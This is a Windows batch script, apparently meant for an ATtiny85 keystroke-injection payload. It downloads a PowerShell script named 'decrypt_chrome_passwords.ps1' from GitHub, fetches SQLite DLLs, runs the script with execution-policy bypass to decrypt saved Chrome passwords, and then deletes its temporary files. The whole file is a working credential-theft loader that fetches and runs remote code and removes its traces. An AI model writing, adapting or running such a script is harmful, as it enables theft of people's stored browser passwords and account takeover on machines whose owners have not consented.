@echo off
:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_package
if not exist %tempDir% mkdir %tempDir%

:: Step 2: Download necessary files
echo Downloading PowerShell script...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/Decrypt%20Chrome%20Passwords/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"

echo Downloading SQLite DLL files...
powershell -Command "Invoke-WebRequest -Uri 'https://www.sqlite.org/2022/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"

:: Step 3: Extract SQLite DLLs
echo Extracting SQLite files...
powershell -Command "Expand-Archive -Path '%tempDir%\sqlite.zip' -DestinationPath '%tempDir%\sqlite' -Force"

:: Step 4: Update PATH to include SQLite DLLs
set PATH=%tempDir%\sqlite;%PATH%

:: Step 5: Execute the PowerShell script
echo Executing PowerShell script...
powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"

:: Step 6: Cleanup temporary files
echo Cleaning up temporary files...
cd /d %temp%
rd /s /q %tempDir%

:: Step 7: Exit
echo Script execution completed.
exit
